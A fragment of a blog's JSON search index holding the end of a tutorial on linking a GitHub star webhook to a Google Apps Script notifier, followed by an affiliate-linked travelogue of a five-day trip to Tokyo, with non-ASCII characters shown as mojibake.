}}DeploymentAfter completing the programming, click the top right corner ‚ÄúDeploy‚Äù -&gt; ‚ÄúNew Deployment‚Äù:Select ‚ÄúWeb Application‚Äù for the type on the left side: Additional Instruction: Enter anything freely, I input ‚ÄúRelease‚Äù Who can access: Please change to ‚ÄúEveryone‚Äú Click ‚ÄúDeploy‚Äù For the first deployment, click ‚ÄúGrant Access‚Äù:After the account selection pop-up appears, choose your current Gmail account:The message ‚ÄúGoogle hasn‚Äôt verified this app‚Äù appears because the app we are developing is for personal use and does not require Google verification.Simply click ‚ÄúAdvanced‚Äù -&gt; ‚ÄúGo to XXX (unsafe)‚Äù -&gt; ‚ÄúAllow‚Äù:After completing the deployment, you can find the Request URL on the ‚ÄúWeb App‚Äù section of the results page. Click ‚ÄúCopy‚Äù and save this GAS URL.‚ö†Ô∏èÔ∏èÔ∏è Off-topic, please note that code changes require deployment to take effect ‚ö†Ô∏èTo apply the code changes, click the top right ‚ÄúDeploy‚Äù -&gt; select ‚ÄúManage Deployments‚Äù -&gt; click the top right ‚Äú‚úèÔ∏è‚Äù -&gt; choose ‚ÄúCreate New Version‚Äù -&gt; click ‚ÄúDeploy‚Äù.The code update and deployment can be completed immediately.Github Webhook Settings Back to Github We can set Webhooks for Organizations (all Repos inside) or a single Repo to monitor new ‚≠êÔ∏è stars. Go to Organizations / Repo -&gt; ‚ÄúSettings‚Äù -&gt; find ‚ÄúWebhooks‚Äù on the left -&gt; ‚ÄúAdd webhook‚Äù: Payload URL : Enter the GAS URL and manually add your own security verification string ?secret=githubWebhookSecret at the end of the URL.For example, if your GAS URL is https://script.google.com/macros/s/XXX/exec and githubWebhookSecret is 123456, then the URL will be: https://script.google.com/macros/s/XXX/exec?secret=123456. Content type: Select application/json Which events would you like to trigger this webhook?Select Let me select individual events.‚ö†Ô∏è Uncheck PushesÔ∏èÔ∏èÔ∏èÔ∏è‚ö†Ô∏è Check Watches (Note: this is not Stars ‚Äî though Stars also monitor star clicks, if using Stars in GAS actions, adjustments are needed) Select ‚ÄúActive‚Äù Click ‚ÄúAdd webhook‚Äù Setup Complete üöÄTestGo back to the Organizations Repo / Repo in Settings and click ‚ÄúStar‚Äù or un-star first, then star again:You will receive a push notification!Work done! üéâüéâüéâüéâBusiness InformationIf you have any questions or suggestions, feel free to contact me. üîó Copy link to share! üç∫ Buy me a beer on PayPal This post was originally published on Medium (View original post), and automatically converted and synced by ZMediumToMarkdown. Improve this page on Github." }, { "title": "Tokyo 5-Day Travel GuideÔΩúTop Tips for Food, Stay & Transport", "url": "/posts/travel-journals/tokyo-5-day-travel-guide-top-tips-for-food-stay-transport-9da2c51fa4f2/", "categories": "Travel Journals", "tags": "english, ai-translation, lifestyle, japan, tokyo, tokyo-disneysea, traveling", "date": "2023-07-10 00:00:37 +0800", "snippet": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off![Travelogue] 2023 Tokyo 5-Day Independent TripFollowing last month‚Äôs trip to K...", "content": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off![Travelogue] 2023 Tokyo 5-Day Independent TripFollowing last month‚Äôs trip to Kyoto-Osaka-Kobe, 2023/06 Tokyo 5-Day Independent Travel Record and Food, Accommodation, and Transportation Information2023/05 Kyoto-Osaka-Kobe 8-Day Independent TripFollowing the previous post ‚Äú[Travelogue] 2023 Kyoto-Osaka-Kobe &amp; üáØüáµ First Landing,‚Äù I returned to Japan again just a week later.You asked why not stay in Japan and take the Shinkansen directly from Osaka to Tokyo. The reason is that the Tokyo trip was the originally planned part of the overseas travel, while the Keihanshin trip was just an extra detour.Since I‚Äôm too lazy to change flight tickets and accommodations, and I don‚Äôt want to work from Japan for a week (I believe when you travel, you should fully enjoy it), I‚Äôll return to Taiwan right after visiting Kyoto, Osaka, and Kobe.Looking back, I‚Äôm glad I came back; during the week I returned to Taiwan, Japan faced a super typhoon, causing floods, Shinkansen suspensions, and station overcrowding. If I had stayed in Japan that week, there probably wouldn‚Äôt have been many places to visit. (Finally, it‚Äôs not the üåßÔ∏è rain god anymore!)Tokyo Trip Group ‚Äî Three Single MenMe &amp; current colleague (Sean) &amp; former colleague (James Lin); Sean &amp; James were college classmates. (Yes, the industry is that small XD) For information on entering Japan and other insights, please refer to previous article.KKday Promotion KKday JapanÔΩúTokyo Disney Resort TicketsÔΩúTokyo Disney Resort Japan eSIM CardÔΩúDaily High-Speed, Total Data, Unlimited Data Plans SHIBUYA SKY Observatory Electronic TicketÔΩúInstant Purchase and Use Japan„ÉªTokyo | Edo„ÉªAsakusa Kaminarimon„ÉªSkytree | Rickshaw Experience [Tokyo Kimono Rental Recommendation!] Tokyo Asakusa, Japan | Kimono Experience (Asakusa‚Äôs first Japanese magazine-style kimono shop, only a 3-minute walk from Kaminarimon) Japan TokyoÔΩúTokyo Tower Main Observatory ÔΩúE-Ticket Pre-Trip PreparationThough we said the Tokyo trip was part of the planned overseas travel, it remained just talk; only after finalizing most of the Kyoto-Osaka-Kobe plans did we begin planning and actually executing the Tokyo part.JoytripmomentFor places I haven‚Äôt been to, I still act like an ENFP and go with the flow, finding everything fresh and exciting. So, I mainly handle the big picture like flights, accommodation, and transportation. As for attractions, I decide based on where my travel companions want to go or where I feel like going at the moment.Fun was mainly handled by Sean &amp; James. We planned to buy tickets in advance for Disneyland (Sea), Yokohama Gundam, and Shibuya Sky; so we purchased the tickets two weeks before departure. If you don‚Äôt buy tickets in advance, there will be no available seats on-site.This time, I brought the leftover from last time, 60,000 yen, and ended up with about 5,000 yen left. Because the Visa card was declined at a drugstore in Shinjuku, I had to pay over ¬•10,000 in cash for cosmetics, and I decided to spend all the remaining cash. Also, I almost couldn‚Äôt return at the end. When buying the ticket to Narita Airport at Tokyo Station, I couldn‚Äôt use a card, so I had to collect cash little by little to pay.Rowüõ´Since this trip is only 5 days and time is limited, I prioritized flights with early departure and late return. Because the dates are close, I went straight to SkyScanner to find flights with good times.Taoyuan &lt;-&gt; Narita 6/7 EVA Air BR 184 08:00 TPE -&gt; NRT 12:25 6/22 EVA Air BR 195 20:40 NRT -&gt; TPE 23:20 Round trip: $17,086 Here is a mistake: You should never buy three plane tickets by yourself. Each person should buy their own ticket because credit card purchases of plane tickets include travel insurance. Later, I found out that flying from Songshan to Haneda wasn‚Äôt much more expensive and was more convenient. Orz.Travel Insurance: Doneüì≤Similarly, buy a 5-day unlimited data SIM card on KKDAY for about $500. ( Japan eSIM CardÔΩúDaily High-Speed, Unlimited Data Plans )üöàSame as the previous article, iPhone users can directly use the Suica card. My friend, who has an Android phone, could only buy the limited-time Welcome Suica card (asked at Narita Airport, it was really the only one left).AccommodationThis time, I only went to Tokyo, so I looked for a hotel where I could stay for four days without changing rooms. Since it was close to the date, the Tokyo chain hotels Toyoko Inn and APA were fully booked. I had to use Agoda to find a hotel near the center of the Tokyo map with train or subway stations nearby.Hotel Villa Fontaine Grand Tokyo-Shiodome ‚Äî 4 nightsYou will arrive at Shiodome Station, from where you can go directly to Odaiba or Shinjuku.If you want to go to other locations, you need to walk to Shimbashi Station (about 10 minutes). From Shimbashi to Tokyo Station, it takes about another 10 minutes (1‚Äì2 stops away).It is quite convenient and reasonably priced, with decent reviews. Staying there, the room is clean and comfortable, and not too small.Since there are three people, the layout includes two beds plus a mattress on the sofa‚Äôs upper bunk (which feels just like a bed when sleeping).3 people total NT$23,894Machi Kusayasu K≈çkan CHO Stay Capsule Hotel - The Only Airport Capsule Hotel in Taiwan | Taoyuan Airport Capsule Hotel | Taoyuan Airport Hotel | Taoyuan Airport Hotel | Taoyuan Airport Hotel ‚Äî Day 0 OvernightThis trip was special because we had an 8 AM flight and both of us were departing from Taipei; planning to arrive at the airport by 6 AM meant leaving home around 4‚Äì5 AM. Plus, the excitement and nervousness about traveling made it hard to fall asleep, so we barely got a few hours of rest.A few days before departure, I decided to stay overnight at the airport the night before. A friend told me that Taoyuan Airport has a capsule hotel, so I decided to give it a try!Location: On the 5th floor of the South Side of Terminal 2, right above Terminal 2 (about a 5-minute walk downstairs)The rooms include double rooms, triple rooms, quadruple rooms, and single beds (about 16 beds per room).When we booked, only single beds were left.1 person NT$1,500Day 0 DepartureBasically, I just unload the things I bought in the Kansai region, take out some clothes and supplies, then reorganize and pack them back into the suitcase before heading out.The Taoyuan Airport MRT pre-check-in service currently does not support next-day flights, so you still have to carry your luggage to Terminal 2.Sean &amp; Me &amp; JamesAfter arriving at Terminal 2, go straight up to the third-floor departure hall. Once there, find the location of the 22‚Äì26 South Mall Observation Deck (facing the hall, walk all the way to the right).Walk to the end and take the escalator up.As soon as you get off the escalator, you will see the hotel entrance with a strong Taiwanese style.Taoyuan Airport Capsule HotelAfter check-in, you can first go in to drop off your luggage, then head outside to find food. No eating or drinking is allowed in the room. For this stay, each guest receives a tea bag, and the front desk can help brew it. You can enjoy it at the bar by the entrance. Filling out a membership form on-site comes with a free towel.Earplugs are available at the entrance for free.CorridorThe bathroom facilities are new, clean, and comfortable. There are two toilets, five shower rooms, and two hairdryers (one is a Dyson). Shower gel and shampoo are provided; just bring your own towel and toiletries.Men‚Äôs BathroomOn the left upon entering, there is a luggage room to store bags. The bed layout is as follows:Bunk Bed DormitoryEach bed has its own mirror, desk, lamp, curtain, and trash bin; I slept on the top bunk, and the mattress was thick, so I didn‚Äôt worry about disturbing the person below when moving around.The mattress is not only thick but also long enough; sleeping at 176 CM is no problem. The environment is clean, the lighting is warm, and the air conditioning is very comfortable. The only unavoidable issue is that snoring can still be heard. (Therefore, free earplugs are provided at the entrance.)However, I‚Äôm not afraid of noise; as long as it‚Äôs cozy and relaxing, I can sleep well. So I slept until dawn and only got up close to 6 a.m. to wash up and check out (fully rested before traveling abroad). Fortunately, we had booked the night before. When other travelers tried to check in on-site, no rooms were available.In the morning, start by leisurely enjoying the airport view:I originally thought it would be crowded at 8 AM, but I was lucky‚Äîthere were almost no people. I should have just stayed in the capsule hotel until 7 AM before coming down!Waiting at the airportThis time, the boarding gate requires taking a shuttle bus (called a ‚Äúferry bus‚Äù by mainland Chinese netizens).It‚Äôs hot and crowded, but I still made it to the boarding gate:Bye üáπüáºArrival at Narita AirportHey üáØüáµDay 1 Shibuya, Parco, Shibuya SkyIt takes about 15 minutes to walk from getting off the plane to the arrival hall. By the time you pick up your luggage and clear customs, it‚Äôs already around 1 PM. When transferring to the Narita Express, I initially made a silly mistake by tapping my Suica card to enter the station; however, the entire express train requires reserved seats. I had to exit the station, buy a ticket, and then re-enter (later I realized it might be possible to buy a ticket directly from the platform machine inside the station).Then took the 2:00 PM Narita Express to Tokyo Station.Enjoying the scenery along the way, seeing the Tokyo Skytree means you‚Äôre almost there.After arriving at Tokyo Station, transfer to the subway to Shimbashi Station, then find your way and walk to Shiodome.The hotel is hidden inside an office building, which is quite unique:At first, I thought I had entered the wrong building and walked into an office tower, but as I went further inside, it turned out to be the hotel.Drop off luggage and take a rest: (The video was filmed later, so it‚Äôs a bit messy XD)Going to Ê∏ãË∞∑ (Shibuya)This intersection is a must-visit shrine, reminding me of the challengers in ‚ÄúAlice in Borderland.‚ÄùNetflix ‚Äî Alice in BorderlandShibuya Parco ‚Äî GokumiyaQueued to taste the famous Kyokumiya. Arrived around 5:30 PM and waited about 45 minutes to get a seat.I ordered the set meal with Kobe beef hamburger steak + Kobe beef steak + soup rice ice cream (¬•3,355):The staff sets the doneness to about 10% cooked, so you need to pick it up yourself and cook it on the iron plate to your preferred doneness.Here, be sure to use two pairs of chopsticks; for hygiene, use the metal ones for cooking and the bamboo ones for eating, alternating between them. Kobe beef steak is incredibly delicious, juicy, and tender inside, with no beefy odor ü§©; the hamburger patty is also good but a bit greasier.Shibuya Parco ‚Äî A Specialty Store for Self-Deprecating Polar BearsAccidentally bought some.Ê∏ãË∞∑ ‚Äî Shibuya SkyLuckily, Sean bought the tickets early; buying them on-site would have meant no entry at all. KKday SHIBUYA SKY Observatory Electronic TicketÔΩúInstant UseIt‚Äôs very dark and a bit windy up there. Bags are not allowed (lockable storage lockers are provided).Except for a bar in the corner, there are no other facilities or light pollution, making it great for photography and night views.Reservations for the bar should be made separately; opening hours are the same as visiting hours.Back at the hotel, still enjoying sake, instant noodles, and snacks to end the dayTofu skin instant noodles are so delicious.Day 2 Yokohama Gundam, Odaiba, ShinjukuEarly the next day, rushed to the 10 AM Gundam show. Took the train to Sakuragicho Station, then transferred to the cable car and walked to the Gundam Factory.Yokohama GundamThe weather is super nice!!The Gundam show runs from 10 AM until noon, with different sessions featuring various storylines; but since I‚Äôm not a Gundam fan, I just glanced through casually.But it must be said, it is very spectacular, with detailed, precise movements and sounds.There are also nearby specialty stores selling Gundam models and exclusive merchandise.Sean‚Äôs Gundam Finished ModelSince I‚Äôm not a Gundam fan, I just walked around, watched a few shows, and left early.OdaibaChange to go to Odaiba. The train from Shiodome to Odaiba is very cool, offering views of Fuji TV and the entire Odaiba area along the way.After arriving at Odaiba, first take a look at the Statue of Liberty in Odaiba.It is one-seventh the size of New York‚Äôs Statue of Liberty, symbolizing the friendship between Japan and France.A little further ahead, looking back, you can see Fuji TV, which was destroyed many times by Ataru in the ‚ÄúKochira Katsushika-ku Kameari K≈çen-mae Hashutsujo‚Äù series.Walk a little further to the mall to eat takoyaki and Taiwanese fried chicken?Takoyaki is too greasy if you eat too many pieces; the chicken cutlet is quite special. Although it says Taiwan karaage, it is actually Japanese-style chicken cutlet (thin and boneless) fried with Taiwanese batter. It‚Äôs different from Taiwanese chicken cutlet, but I still told the staff it was delicious and that I‚Äôm Taiwanese ü§£.I originally planned to shop for clothes and shoes at a department store in Odaiba, but as I was approaching, I noticed the subway could take me to Shinjuku; so I suddenly changed direction and headed to Shinjuku.ShinjukuStart shopping and exploring aroundWent to La Lebo to smell the Tokyo-exclusive GAIAC No. 10 scent.It feels very light‚Ä¶ woody notes‚Ä¶ hard to detect the scent. (But I still went for it on Day 4)Finally, I only went to the department store to buy clothes, pants, and cosmetics. When the weather started to turn rainy and cloudy, I returned to the hotel.End the day with food as usualHot dogs are delicious, and fruit wine is tasty!Day 3 DisneySeaSet off early in the morning; the weather was drizzly and overcast. KKday JapanÔΩúTokyo Disney Resort TicketsÔΩúTokyo Disney ResortWe bought access to the ocean, not the land. That beautiful castle is only on the land; to enter the ocean area, you need to take the park‚Äôs shuttle train. After entering the park, we tried to draw tickets for shows or entry, but didn‚Äôt win any. Finally, we purchased front-row seats for the evening fireworks show ‚ÄúBelieve! ~Sea of Dreams~‚Äù (you can also watch from outside without buying tickets, as the show takes place in the harbor public area).The rain got heavier, so I first went to a roadside shop to buy a Mickey raincoat:I personally think the quality and material are quite good. There are also cute Mickey or Minnie (dark red) designs to choose from, and they are affordable!! Luckily, it stopped raining after noon!! I‚Äôm not a rain guy!!After buying the raincoat, head straight to ‚ÄúToy Story Mania!‚Äù:There were many people, and I waited in line for about 100 minutes before getting in:The game is played in pairs (or against AI if alone), where players press buttons to shoot projected balloons and score points. It is highly fun and low in intensity, making it perfect for couples or families.Next to it, there is an interactive show featuring Mr. Potato Head and a small souvenir shop:A very cute Brother Bao plush toy!!Next is ‚ÄúSoaring: Fantastic Flight Images,‚Äù another popular attraction:After lining up and before the game starts, there will be a scene introduction featuring the explorer‚Äôs story. The paintings hanging on the wall are actually high-resolution screens with animations and voiceovers, creating an impressive effect!The theater features a spherical dome screen plus a 4D experience (seats rise and move forward, with air and scent effects). The content showcases landscapes from around the world‚Äîfor example, the grassland scenes include the scent of the prairie. It‚Äôs very impressive and suitable for everyone! Here, we purchased the express pass.After enjoying these two attractions and approaching noon, we started looking for food. Since the restaurants were all full, we had to settle for snacks. We casually ate pizza, chicken legs, and so on.Holding food, the harbor show event ‚ÄúTogether in Colorful Celebration‚Äù just started:After eating, start strolling around the park and visiting souvenir shops:After digesting, we started lining up for the ‚ÄúJourney to the Center of the Earth‚Äù:It takes about 90‚Äì100 minutes, just enough to fully digest it, otherwise it‚Äôs too intense XDThe content recreates the movie Journey to the Center of the Earth, with impressive scenes and immersion; at the end, there is acceleration and a slight downward drop (weightlessness), offering strong excitement without making your legs weak. It‚Äôs suitable for friends looking for a bit of thrill.Afterwards, we went next door to ‚Äú20,000 Leagues Under the Sea‚Äù to relax a bit:Not many people. The content mimics the feeling of a submarine launch and exploration (but it is likely a simulation). It is not very thrilling and only suitable for young children.After the ride, continue exploring and eating:A cute but very sweet Mickey popsicle, and also Annabelle (Lina Bell).Keep walking and snapping photos. The park is really big. I only took pictures of some decorations and didn‚Äôt capture any animated or fantasy scenes:At the end, I went on the ‚ÄúIndiana Jones Adventure: Temple of the Crystal Skull‚Äù:Not as thrilling as a journey to the Earth‚Äôs core (no weightlessness or rapid descent), the content features immersive scenes from the Indiana Jones movie. Personally, I found it fun and enjoyable.Continuing with a quick overview:Also took the ‚ÄúDisneySea Ferry Line‚Äù and the ‚ÄúDisneySea Electric Railway‚Äù because my feet were sore from walking. It was nice to enjoy the scenery along the way; these are more like park transportation facilities without special amusement effects.As evening approached, we started shopping heavily and taking photos:I have to say, it‚Äôs easy to go crazy buying because there are many 40th anniversary limited editions; also took a photo with the Earth.Close to the show start time, begin walking back to the harbor and sit on the ground in the seating area.As mentioned earlier, we purchased regular seats for viewing.The entire show offers a strong immersive experience, including music, projections (a volcano erupts at the back!), lasers, fireworks, and DisneySea-related character stories‚Ä¶ all well integrated. You must stay until the evening to watch the full performance to get your money‚Äôs worth. My full day at Disney taught me that all the attractions are highly immersive. They are not just rides but aim to let visitors fully embody the characters and scenes. Although they are less thrilling than Universal Studios, I found them very entertaining. The nighttime fireworks show is a must-see! Many cute merchandise items‚Äîcontrol your hands (stop yourself from buying)! For food, I eat randomly and think it‚Äôs better to bring my own food from outside. If time permits, plan for two days‚Äîone on land and one at sea. The sea portion does not include the Dream Castle or the land parade QQ.Outside JR Maihama Station, there is one last official merchandise store where you can buy souvenirs. I browsed there once more before reluctantly leaving.After returning to the hotel, continued the daily routine; today had soy sauce instant noodles, cantaloupe juice with pulp (delicious!!), Qiuyas‚Äô plum wine (delicious!!), and oolong shochu (tasteless, not good).Day 4 Tokyo Tower, Meiji Shrine, Le Labo, Kameari Udon Police Station, Asakusa Kaminarimon, SkytreeAfter a good night‚Äôs sleep, I started planning today‚Äôs itinerary (typical crazy ENFP). The only group activity is visiting Tokyo Skytree at night; in the morning, my friends went to Akihabara, so it‚Äôs a day of solo exploration in Tokyo.Tokyo TowerLooking at the map, Shimbashi is not far from Tokyo Tower; so we decided to go there first.Stepping outside, I found a serious delay on the subway. Checking Google Maps, the distance wasn‚Äôt far, so I decided to walk instead (about 20 minutes):Walking alone on the streets of Tokyo, enjoying the scenery. In June, it‚Äôs not too hot yet, and the breeze feels very pleasant.Encountering a vendor selling hot roasted sweet potatoes by the roadsideWhen walking quickly to Tokyo Tower, I passed through a park called ‚ÄúTokyo Metropolitan Shiba Park.‚Äù Viewing the tower through the branches here offers a unique perspective:Continuing along the footpath of the hill, you will reach the base of Tokyo Tower. KKday Japan TokyoÔΩúTokyo Tower Main Observatory ÔΩúE-TicketAfter entering the tower, I bought a Top Deck ticket; it not only allows access to the top of the tower but also includes a guided tour (with Chinese audio) and a souvenir photo to commemorate the visit! (Great experience)The guided tour features murals similar to the moving ones at Disney yesterday XD. Two predecessors are having a conversation, discussing the construction of a iconic Japanese building. The same architect‚Äôs other work is the Tsutenkaku Tower in Osaka.The morning aerial view of Tokyo is also nice. In the third photo, the distant tower is the Skytree, where we will go in the evening.Finally, here is the free summit success commemorative photo!Meiji ShrineAfter visiting Tokyo Tower, I checked the map and decided to head to Meiji Shrine next.After exiting the subway, I walked a long way (about 30 minutes) to reach Meiji Shrine.A special moment was encountering a traditional Japanese wedding and watching from the side:Finally, after completing the worship at the main hall, we left.I found Meiji Shrine to be more solemn and dignified, while later at Senso-ji Temple, there were too many tourists, making it feel very crowded.The next stop is the turtle I‚Äôve seen since childhood‚ÄîKameari from the ‚ÄúKochira Katsushika-ku Kameari K≈çen-mae Hashutsujo‚Äù (Kochikame). I want to see what it looks like. On the way there, I‚Äôll stop by Le Labo in Omotesando to smell their scents again.LE LABO Aoyama StoreActually, I‚Äôm not very interested in Le Labo. I personally prefer Ormonde Jayne‚Äôs perfumes, and Le Labo feels to me like it‚Äôs marketed to the mass audience.After sampling several, I bought Another 13 for its strong scent; I also followed the trend and bought the Tokyo-exclusive Gaiac 10, both in 15ml as souvenirs.Le Labo perfumes are packaged and labeled on-site (about 15‚Äì20 minutes), allowing you to customize your own label; 13 is my personal favorite, so I chose ‚ÄúZhgChgLi,‚Äù and 10 represents Tokyo. I asked the staff in broken English which one represents Japan, and he said ‚ô®Ô∏è üòù.The price for Le Labo in Japan is as above. With tax exemption, it comes to 13,000 yen minus an additional 1,000 yen.The Tokyo-exclusive Gaiac 10 is more expensive, costing ¬•16,800 after tax exemption.Turtle Has the Wulong Police StationAfter buying, continue heading to Kameari (Kameari is really quite far).Right outside the main station exit, there is a statue of the characters from ‚ÄúKochira Katsushika-ku Kameari K≈çen-mae Hashutsujo‚Äù:Check the map and head to the Turtle Park near the back station for a stroll:It‚Äôs just an ordinary park QQ, with many kids playing soccer inside. There was a park bench with a statue of a person sitting cross-legged, covered with many children‚Äôs bags and belongings, so I didn‚Äôt take a photo.Check online for the nearby Ario department store, which has scenes and a playground from the manga ‚ÄúKochira Katsushika-ku Kameari K≈çen-mae Hashutsujo,‚Äù then continue walking (about 10 minutes):After entering, my mindset collapsed. It‚Äôs almost certain that the creators no longer maintain the ‚ÄúWulong Police Station‚Äù IP (young people don‚Äôt watch it anymore‚Ä¶). Besides the portraits of people coming out of the station, from the everyday park in front to the so-called Wulong Police Station amusement park, only the sets remain. Beyond the sets, it has been converted into an amusement area (claw machines).The worst part was the A-Liang capsule toy machine at the entrance. The eyes of the A-Liang figure were broken and never fixed, making it look very miserable. In the end, I got a hot pants detective and left feeling disappointed.Taking the bus to Asakusa is closer according to the map. It took about 15 minutes to check the route and walk to the bus stop:On the way to the bus stop, there were almost no people or tourists, and Google couldn‚Äôt even translate the bus routes; we had truly arrived in a non-tourist area.When I got on the bus, I made a mistake because in Kyoto, you pay when you get off. So I just stood there clueless when boarding, and I couldn‚Äôt understand Japanese. It wasn‚Äôt until a kind Japanese passenger said ‚Äúpay pay‚Äù that I realized I needed to go to the front to tap my card and pay.The ride was quiet and comfortable. Japanese drivers always wait until passengers are seated or have stood up to get off before starting the vehicle. We leisurely arrived at Senso-ji Temple. KKday Japan„ÉªTokyo | Edo„ÉªAsakusa Kaminarimon„ÉªSkytree | Rickshaw Experience KKday „ÄêTokyo Kimono Rental Recommendation!„ÄëAsakusa, Tokyo, Japan | Kimono Experience (Asakusa‚Äôs First Japanese Magazine Style Kimono Shop, Only a 3-Minute Walk from Kaminarimon)There are really a ton of tourists!! It‚Äôs so crowded, I can only find angles to take photos.Continuing deeper into Senso-ji Temple, there were too many tourists. I originally didn‚Äôt plan to buy anything and just wanted to look around; along the way, I tried this bean shop, and it was unexpectedly delicious, so I bought some as souvenirs.There were still many people at Senso-ji Temple, so I just took some photos and left.At this time, it was nearing evening, and we slowly started moving toward the Tokyo Skytree.View of Tokyo Skytree from Senso-ji Temple.Tokyo SkytreeSince it was still early, we walked along the way to enjoy the scenery. KKday Tokyo Skytree Observatory Ticket / Enjoyment Package Tokyo Subway 24-hour Ticket / Sumida AquariumGetting closer and bigger.After arriving at Tokyo Skytree, first take a stroll inside the shopping mall, and order a cup of Hokkaido strawberry ice cream to relax.We didn‚Äôt get tickets for the Top Deck of the Skytree, only for the middle observation deck. Entry was at 7 PM.When I first arrived, it was still not dark, so I casually took a few shots:After sunset, you can overlook the entire Tokyo night view, which is very beautiful:The top left corner of the first picture shows Tokyo Tower in the distance; the interior is very dark, and the glass reflects light, making it difficult to take good selfies.Forced to take a photo XDA final glance back before leaving.On the last night, enjoy some izakaya food and capture night scenes along the way:Charcoal-Grilled ChickenThe weather in Japan turned bad starting today. I didn‚Äôt expect to see Tokyo Tower and special installation art every day passing through Shiodome. I only stopped to appreciate them on the last day.Midnight Snack on the Last NightNissin instant noodles still taste the best, especially with convenience store fried chicken ü§§! A few days ago, I bought cantaloupe juice with fruit pulp, and today I got strawberry juice‚Äîjust as tasty. I don‚Äôt remember the sake; these two are probably so-so.Day 5: National Diet Building, Imperial Palace, Tokyo Station, Return TripAfter waking up, I went to drop off my luggage. Like Day 4, I explored Tokyo alone and spontaneously, as my flight was in the evening and I still had most of the day to wander around. The weather was gloomy and rainy.Thinking of the capsule toy machine at Tokyo Skytree yesterday, I saw a Japanese landmark featuring the National Diet Building, which I had never seen before, so I headed there first.Parliament HouseOne interesting event was encountering an extremist Japanese protest on the street:Driving a promotional vehicle loudly broadcasting near the Parliament building, he was stopped by the police who removed his loudspeaker; later, he sped through a red light to escape, but with police everywhere, it was quite scary.After passing by the Capitol and seeing the main entrance closed, we didn‚Äôt go in (it seems you can enter for a tour through the side door?):Take a quick photo from afar as a souvenir, then head down towards the Imperial Palace.The Imperial PalaceThe Imperial Palace is really huge; just walking from the outermost entrance took about 30 minutes.After reaching the Tenshudai, we left. The Imperial Palace was not open for visits that day.Walked for almost another hour and returned to the Tokyo Station area (you can take the subway, but it‚Äôs just one or two stops; I prefer walking around the streets to enjoy the scenery).Tokyo StationIt was nearing noon, and I wandered around Tokyo Station; just proving I wouldn‚Äôt get lost, but I was too lazy to wait in line at the famous souvenir shops.The last meal was tempura soba.Stopped by a liquor store and bought one large and one small bottle of sake to bring back to Taiwan; the clerk was also Taiwanese.Return TripAround 4 PM, I returned to the hotel to pick up my luggage and slowly headed to Narita Airport.A corner of Shinbashi before leaving.For the return trip, we went directly from Shinbashi to Narita Airport. Due to schedule issues and plenty of time, we took the Toei Asakusa Line Airport Express, which takes about 1 hour and 15 minutes; however, you cannot use IC cards or Suica to buy tickets, so we had to scramble to gather enough money for three tickets and almost couldn‚Äôt afford them.Arriving at the airport around 5:30 is still very early.After leaving the country, it was still early, so I grabbed a quick bite to fill my stomach and then made a final stop at the duty-free shop.I found that if you want to buy Dassai or common souvenirs (Shiroi Koibito, banana cake‚Ä¶), they have everything here. Just buy them here XDDassai and I bought it at Tokyo Station for about the same price.Boarding, Hey üáπüáº:The weather in Japan was very bad, with constant shaking (dead fish eyes), more thrilling than Disney rides, causing meal times to be paused; luckily, we finally arrived safely in Taiwan.Going through immigration took about 12 minutes. Taking an unlicensed taxi back to Taipei took until around 1:30 AM. Took a shower and went straight to sleep, ending this trip.Postscript For insights on Japanese culture, please refer to the previous article ‚Äú[Travelogue] 2023 Kyoto-Osaka-Kobe &amp; üáØüáµ First Landing‚Äù. Japanese time notation uses a 30-hour system; 25:00 means 1:00 AM. It‚Äôs pretty cool. You should always carry at least around 10,000 yen in cash to avoid situations where cards or Vias cards cannot be used. Thanks to my travel companions this time, Sean INFJ / James ISTJ, the planning experts; Sean controlled the trip by deciding how to play Disney first and which fast passes were worth buying. The catchy song that keeps playing on repeat after returning to Taiwan.KKday Promotion KKday JapanÔΩúTokyo Disney Resort TicketsÔΩúTokyo Disney Resort Japan eSIM CardÔΩúDaily High-Speed, Total Data, Unlimited Data Plans SHIBUYA SKY Observatory Electronic TicketÔΩúInstant Use Japan Tokyo | Edo Asakusa Kaminarimon &amp; Skytree | Rickshaw Experience Tokyo Kimono Rental Recommendation!„ÄëAsakusa, Tokyo, Japan | Kimono Experience (Asakusa‚Äôs First Japanese Magazine Style Kimono Shop, Only a 3-Minute Walk from Kaminarimon) Japan TokyoÔΩúTokyo Tower Main Observatory Tokyo TowerÔΩúE-ticket If this article is helpful to you, please consider using my referral link to purchase KKday products and tours. I will receive a commission to support more travel content creation. Thank you.If you have any questions or suggestions, feel free to contact me.More Travelogues Tokyo Area Travel GuideÔΩúKawagoe Little Edo &amp; Atami Fireworks Festival 5-Day Itinerary Busan Travel GuideÔΩú8-Day Itinerary with VISIT BUSAN PASS for Seamless Exploration San‚Äôin &amp; Kansai 7-Day Solo TripÔΩúExplore Izumo, Matsue, Tottori, Himeji, Osaka, Kobe Bangkok Travel GuideÔΩú5-Day Independent Trip Highlights in Thailand Kyushu 9-Day Independent TripÔΩúBusan to Hakata Cruise Entry and Scenic Tours Sanyo Region Travel GuideÔΩú6-Day Hiroshima &amp; Okayama Itinerary for Freedom Seekers Kyushu 10-Day Solo Travel GuideÔΩúExplore Fukuoka, Nagasaki &amp; Kumamoto Efficiently Nagoya One-Day Quick TripÔΩúPeach Aviation Flight Experience and Travel Tips Tokyo 5-Day Travel GuideÔΩúTop Tips for Food, Stay &amp; Transport Kyoto Osaka Kobe 8-Day ItineraryÔΩúFree Travel Guide with Food, Stay &amp; Transit TipsFound this guide useful? Use my KKday referral link to book your trip‚ÄîI‚Äôll earn a small commission to support more content like this. Thank you! üîó Copy link to share! üç∫ Buy me a beer on PayPal This post was originally published on Medium (View original post), and automatically converted and synced by ZMediumToMarkdown. Improve this page on Github." }, { "title": "Kyoto Osaka Kobe 8-Day ItineraryÔΩúFree Travel Guide with Food, Stay & Transit Tips", "url": "/posts/travel-journals/kyoto-osaka-kobe-8-day-itinerary-free-travel-guide-with-food-stay-transit-tips-76d66c2e34af/", "categories": "Travel Journals", "tags": "english, ai-translation, 